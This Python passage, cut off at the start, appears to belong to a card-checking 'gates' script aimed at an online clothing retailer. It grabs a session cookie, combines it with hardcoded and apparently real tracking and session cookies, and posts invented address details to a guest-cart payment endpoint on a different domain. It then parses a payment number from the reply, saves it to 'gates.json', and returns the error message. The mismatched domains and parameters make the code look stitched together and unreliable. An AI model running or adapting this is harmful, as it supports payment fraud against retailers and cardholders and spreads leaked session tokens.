		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
		}
		
		params = {
		    'bypassSessionYn': 'N',
		}
		
		response = requests.get('https://m.wconcept.com/api/common/cart-count', params=params, headers=headers)
		
		cookies = str(response.cookies)
		
		wcus_fo_session_prod = re.search(r'wcus-fo-session-prod=(.*?)[, ]', cookies).group(1)
		cp=(wcus_fo_session_prod)
		cookies = {
    'recordID': '9ec818c9-94e5-4bdd-9387-77693ad0fa1a',
    '_ga': 'GA1.1.1062965470.1712470406',
    '_tt_enable_cookie': '1',
    '_ttp': 'SePZUmlmPp4tjpxSCi1sG4_2CrN',
    '_pin_unauth': 'dWlkPU5HWmpaVEV6TkRBdFlUa3lOQzAwWkdReExXSTNNemt0WldNek5ESTFOell5TTJKaw',
    '_fbp': 'fb.1.1712470408911.1674008412',
    'wusCtgryNm': 'WOMEN',
    'agreeYn': 'Y',
    'ypa': 'YP1.kMA9g6KRN-7kH7mXmnQy',
    '__stripe_mid': '746feca8-88e2-4389-bf4a-e737b754c301ef05ca',
    '_gcl_au': '1.1.444116769.1712504287',
    'apay-session-set': 'pYtmZoOoUeFPY9Xi5wsc9MbM%2F520Qf6FDKvGv3s5Dw1p0mbXoLyI3TYMKAgkDRk%3D',
    'dmSessionID': 'bb61e790-51ff-4433-a5e6-927b4c52bcc5',
    'wcus-fo-session-prod': cp,
    'ESW_LTI': '{%22countryIso%22:%22US%22%2C%22currencyIso%22:null%2C%22pricingSyncId%22:null%2C%22isESWCountry%22:false%2C%22isFixedPricing%22:false}',
    'hidePrmNoti': 'Y',
    'hideGuideYn': 'Y',
    '_TODAYALLLIST': '%5B%7B%22todayGodSectCd%22%3A%22GOD%22%2C%22godNo%22%3A%22720088284%22%2C%22regDt%22%3A1712618711256%7D%5D',
    '__stripe_sid': '29421c03-cdf4-4c89-b519-fa96370eb693ebad0a',
    'language': 'en_US',
    'ledgerCurrency': 'USD',
    'cto_bundle': '1yUvwV8wV3g5NE4zYmtBNXVPSTR2bkpvbWhFT0FmbSUyQm4zeEdmNyUyRkt0eDF1anF3NWNrUFlHY3JCVEYybjFhZzZHRzlnUDlPdUFlSjRUWXljVWlnWUQxJTJGTmdlZFhYMExHTkVYMGFqTXNqZ1lkeXFLaXBSaUZvVzQzSnZGNm1pNUo5SEQ3NGdPRk9JczVBaDRONTRZUUtFb3Q5dFElM0QlM0Q',
    '_ga_0G3GV44XGJ': 'GS1.1.1712618630.4.1.1712619862.0.0.0',
    '_ga_5Y8Z74CC6Y': 'GS1.1.1712618622.6.1.1712619862.48.0.971558836',
}
		
		headers = {
		    'authority': 'm.wconcept.com',
		    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
		    'cache-control': 'max-age=0',
		    # 'cookie': 'recordID=9ec818c9-94e5-4bdd-9387-77693ad0fa1a; _ga=GA1.1.1062965470.1712470406; _tt_enable_cookie=1; _ttp=SePZUmlmPp4tjpxSCi1sG4_2CrN; _pin_unauth=dWlkPU5HWmpaVEV6TkRBdFlUa3lOQzAwWkdReExXSTNNemt0WldNek5ESTFOell5TTJKaw; _fbp=fb.1.1712470408911.1674008412; wusCtgryNm=WOMEN; agreeYn=Y; hidePrmNoti=Y; ypa=YP1.kMA9g6KRN-7kH7mXmnQy; __stripe_mid=746feca8-88e2-4389-bf4a-e737b754c301ef05ca; _gcl_au=1.1.444116769.1712504287; language=en_US; ledgerCurrency=USD; apay-session-set=pYtmZoOoUeFPY9Xi5wsc9MbM%2F520Qf6FDKvGv3s5Dw1p0mbXoLyI3TYMKAgkDRk%3D; dmSessionID=e5113d4c-f2d0-43e6-a199-de2549c06f53; wcus-fo-session-prod=cDJjMGZmOGNkNzVmOTVmOTBjMmFmMGU4OGE0ZTViMGJmYzQ0ZDRlNGZhOWY3N2Q5ZmYyMzFkYTFl; ESW_LTI={%22countryIso%22:%22US%22%2C%22currencyIso%22:null%2C%22pricingSyncId%22:null%2C%22isESWCountry%22:false%2C%22isFixedPricing%22:false}; _TODAYALLLIST=%5B%7B%22todayGodSectCd%22%3A%22GOD%22%2C%22godNo%22%3A%22710791406%22%2C%22regDt%22%3A1712521186008%7D%5D; __stripe_sid=c6457e1f-d114-450d-b214-b554024d94c95c71d8; cto_bundle=rptFDl8wV3g5NE4zYmtBNXVPSTR2bkpvbWhNJTJCamFzV2xTRUxvVElFR1lid0RDdUpSY0M4JTJGd0p0VktvemgzaHllUlFEbkkzJTJCc25XeklJdVk2T1dPY21oJTJGNHB1SU1UN1U2bUNmMGZNeUFmV05ZNTF3Qzd6ZFAlMkZlOFdCYVFRQlpCdSUyQldNczJheWdFaU5VVFpCJTJGaUt0SGJUNGxHZyUzRCUzRA; _ga_0G3GV44XGJ=GS1.1.1712521176.3.1.1712521739.0.0.0; _ga_5Y8Z74CC6Y=GS1.1.1712521170.4.1.1712521739.60.0.118374253',
		    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'document',
		    'sec-fetch-mode': 'navigate',
		    'sec-fetch-site': 'none',
		    'sec-fetch-user': '?1',
		    'upgrade-insecure-requests': '1',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
		}
		
		params = {
		    'type': 'pay',
		    'addrseNm': 'mska',
		    'addrseFamilyNm': 'wj',
		    'addrseBaseAddr': '2058 Duncan Avenue',
		    'addrseDetailAddr': '',
		    'addrseCtyNm': 'Huntington',
		    'addrseLcltyUsCd': 'CO',
		    'addrseLcltyCd': 'LCLTY_06',
		    'addrseLcltyNm': 'Colorado',
		    'addrsePostNo': '11743',
		    'addrseMobilNo': '2076516786',
		    'dlvAdbukTurn': '0',
		    'coprtNm': '',
		}
		
		response = requests.get('https://www.michiganmotorz.com/rest/default/V1/guest-carts/pOKNGx6MBWEWf6y24t8gZUNjCnbwCpXE/payment-information', params=params, cookies=cookies, headers=headers)
		text=(response.text)
		payNo_pattern = re.compile(r'"payNo":"([^"]+)"')
		matches = payNo_pattern.search(text)
		payNo = matches.group(1)
		
		with open('gates.json', 'r') as file:
			json_data = json.load(file)
		json_data['session'] = cp
		json_data['payNo'] = payNo
		with open('gates.json', 'w') as file:
			json.dump(json_data, file, indent=2)
	return (response.json()['errorMessage']).split(';')[0]